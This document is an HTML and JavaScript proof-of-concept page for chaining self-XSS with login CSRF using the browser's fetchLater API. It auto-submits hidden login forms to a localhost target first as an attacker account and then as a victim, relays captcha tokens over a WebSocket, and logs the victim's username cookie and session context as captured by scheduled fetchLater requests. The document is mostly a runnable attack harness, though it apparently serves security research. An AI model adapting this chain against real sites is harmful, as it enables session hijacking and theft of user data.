<!DOCTYPE html>
<html>
<head>
    <title>Enhanced Self-XSS + CSRF Chain Exploit with fetchLater</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 1800px; margin: 0 auto; }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #ccc; border-radius: 5px; }
        .logs { background-color: #f5f5f5; max-height: 400px; overflow-y: auto; }
        .log-entry { margin: 5px 0; padding: 5px; background-color: white; border-left: 3px solid #007bff; }
        .log-entry.attacker { border-left-color: #dc3545; }
        .log-entry.victim { border-left-color: #28a745; }
        .status { padding: 10px; margin: 10px 0; border-radius: 3px; }
        .status.waiting { background-color: #fff3cd; border: 1px solid #ffeaa7; }
        .status.success { background-color: #d4edda; border: 1px solid #c3e6cb; }
        .status.error { background-color: #f8d7da; border: 1px solid #f5c6cb; }
        button { padding: 10px 20px; margin: 5px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer; }
        button:hover { background-color: #0056b3; }
        button:disabled { background-color: #6c757d; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Enhanced Self-XSS + CSRF Chain Exploit with fetchLater</h1>
        
        <div class="section">
            <h3>Exploit Flow</h3>
            <ol>
                <li>Opens new tab and logs in as attacker account</li>
                <li>XSS payload triggers fetchLater requests with session tracking</li>
                <li>XSS logs out the attacker account</li>
                <li>Exploit initiates victim login in new tab</li>
                <li>fetchLater requests continue with victim's session context</li>
            </ol>
        </div>

        <div class="section">
            <h3>Controls</h3>
            <button id="startExploit" onclick="startExploit()">Start Exploit</button>
            <button id="clearLogs" onclick="clearLogs()">Clear Logs</button>
            <div id="status" class="status waiting">Ready to start exploit</div>
        </div>

        <div class="section">
            <h3>fetchLater Request Logs</h3>
            <div id="logs" class="logs">
                <div class="log-entry">Waiting for fetchLater requests...</div>
            </div>
        </div>
    </div>

    <script>
        let attackerTab = null;
        let victimTab = null;
        let exploitPhase = 'ready'; // ready, attacker-login, attacker-active, victim-login, victim-active
        let fetchLaterInterval = null;
        let logCounter = 0;
        let totalRequests = 12;

        // WebSocket connection for coordination
        let ws = null;

        function log(message, type = 'info') {
            const logsDiv = document.getElementById('logs');
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry ${type}`;
            logEntry.innerHTML = `<strong>[${timestamp}]</strong> ${message}`;
            logsDiv.appendChild(logEntry);
            logsDiv.scrollTop = logsDiv.scrollHeight;
            console.log(`[${timestamp}] ${message}`);
        }

        function updateStatus(message, type = 'waiting') {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
        }

        function clearLogs() {
            document.getElementById('logs').innerHTML = '<div class="log-entry">Logs cleared...</div>';
            logCounter = 0;
        }

        function connectWebSocket() {
            ws = new WebSocket('wss://localhost:8445');
            
            ws.onopen = () => {
                log('WebSocket connected for exploit coordination');
                ws.send(JSON.stringify({ type: 'exploit-ready' }));
            };

            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                handleWebSocketMessage(data);
            };

            ws.onerror = (error) => {
                log('WebSocket error: ' + error, 'error');
            };

            ws.onclose = () => {
                log('WebSocket connection closed');
            };
        }

        function handleWebSocketMessage(data) {
            switch(data.type) {
                case 'attacker-logged-in':
                    log('âœ… Attacker successfully logged in', 'attacker');
                    exploitPhase = 'attacker-active';
                    updateStatus(`Attacker logged in, XSS payload active - ${totalRequests} fetchLater requests scheduled`, 'success');
                    break;
                
                case 'attacker-logged-out':
                    log('ðŸ”“ Attacker logged out, starting victim login phase', 'attacker');
                    exploitPhase = 'victim-login';
                    updateStatus('Starting victim login phase', 'waiting');
                    setTimeout(() => startVictimLogin(), 2000);
                    break;
                
                case 'victim-logged-in':
                    log('âœ… Victim successfully logged in', 'victim');
                    exploitPhase = 'victim-active';
                    updateStatus('Victim logged in, fetchLater requests now use victim context', 'success');
                    break;

                case 'fetchlater-data':
                    logCounter++;
                    const logData = JSON.parse(data.data);
                    console.log('ðŸ“¡ fetchLater data received:', logData);
                    const requestData = logData.requestData || {};
                    const currentUser = logData.user || 'unknown';
                    const requestNum = requestData.requestNumber || logCounter;
                    const scheduledBy = requestData.scheduledBy || 'unknown';
                    const activateAfter = requestData.activateAfter || 0;
                    
                    const message = `ðŸ“¡ fetchLater #${requestNum}/${totalRequests} - Delay: ${activateAfter/1000}s | Scheduled by: ${scheduledBy} | Current user: ${currentUser} | Username cookie: ${logData.sessionId}`;
                    log(message, currentUser);
                    
                    // Update status with progress
                    if (requestNum <= totalRequests) {
                        updateStatus(`fetchLater requests active: ${requestNum}/${totalRequests} completed (Current context: ${currentUser})`, 'success');
                    }
                    break;
            }
        }

        function startExploit() {
            log('ðŸš€ Starting enhanced exploit flow');
            updateStatus('Initializing exploit...', 'waiting');
            
            // Connect WebSocket for coordination
            connectWebSocket();
            
            // Start with attacker login
            setTimeout(() => startAttackerLogin(), 1000);
            
            // Disable start button
            document.getElementById('startExploit').disabled = true;
        }

        function startAttackerLogin() {
            log('ðŸ”‘ Opening new tab for attacker login');
            exploitPhase = 'attacker-login';
            updateStatus('Logging in as attacker...', 'waiting');
            
            // Open new tab with attacker login
            attackerTab = window.open('about:blank', 'attackerTab');
            
            // Create the attacker login page with enhanced XSS payload
            const attackerLoginHTML = `
                <!DOCTYPE html>
                <html>
                <head><title>Attacker Login</title></head>
                <body>
                    <h2>Attacker Login Phase</h2>
                    <form id="loginForm" action="https://localhost:8443/login" method="POST">
                        <input type="hidden" name="username" value="attacker" />
                        <input type="hidden" name="password" value="attacker" />
                        <input type="hidden" name="captchaToken" id="captchaInput" value="" />
                    </form>
                    
                    <script>
                        const form = document.getElementById('loginForm');
                        const captchaInput = document.getElementById('captchaInput');
                        
                        // Connect to WebSocket for captcha token
                        const ws = new WebSocket('wss://localhost:8445');
                        ws.onopen = () => {
                            ws.send(JSON.stringify({ type: 'attacker-login-ready' }));
                        };

                        ws.onmessage = (event) => {
                            const data = JSON.parse(event.data);
                            if (data.type === 'captcha') {
                                captchaInput.value = data.captchaToken;
                                form.submit();
                            }
                        };
                    <\/script>
                </body>
                </html>
            `;
            
            attackerTab.document.write(attackerLoginHTML);
            // attackerTab.document.close();
        }

        function startVictimLogin() {
            log('ðŸŽ¯ Opening new tab for victim login');
            updateStatus('Logging in as victim...', 'waiting');
            
            // Close attacker tab if still open
            if (attackerTab && !attackerTab.closed) {
                //attackerTab.close();
            }
            
            // Open new tab with victim login
            victimTab = window.open('about:blank', 'victimTab');
            
            const victimLoginHTML = `
                <!DOCTYPE html>
                <html>
                <head><title>Victim Login</title></head>
                <body>
                    <h2>Victim Login Phase</h2>
                    <form id="loginForm" action="https://localhost:8443/login" method="POST">
                        <input type="hidden" name="username" value="victim" />
                        <input type="hidden" name="password" value="victim" />
                        <input type="hidden" name="captchaToken" id="captchaInput" value="" />
                    </form>
                    
                    <script>
                        const form = document.getElementById('loginForm');
                        const captchaInput = document.getElementById('captchaInput');
                        
                        // Connect to WebSocket for captcha token
                        const ws = new WebSocket('wss://localhost:8445');
                        ws.onopen = () => {
                            ws.send(JSON.stringify({ type: 'victim-login-ready' }));
                        };

                        ws.onmessage = (event) => {
                            const data = JSON.parse(event.data);
                            if (data.type === 'captcha') {
                                captchaInput.value = data.captchaToken;
                                form.submit();
                            }
                        };
                    <\/script>
                </body>
                </html>
            `;
            
            victimTab.document.write(victimLoginHTML);
            victimTab.document.close();
        }

        // Listen for messages from child tabs
        window.addEventListener('message', (event) => {
            if (event.origin !== window.location.origin) return;
            
            const data = event.data;
            if (data.type === 'fetchlater-log') {
                // Log fetchLater requests from XSS payload
                logCounter++;
                log(`ðŸ“¡ fetchLater #${logCounter} - ${data.message}`, data.userType || 'info');
            }
        });

        // Cleanup on page unload
        window.addEventListener('beforeunload', () => {
            if (attackerTab && !attackerTab.closed) attackerTab.close();
            if (victimTab && !victimTab.closed) victimTab.close();
            if (ws) ws.close();
        });

        // Initialize
        log('Exploit page loaded and ready');
    </script>
</body>
</html>
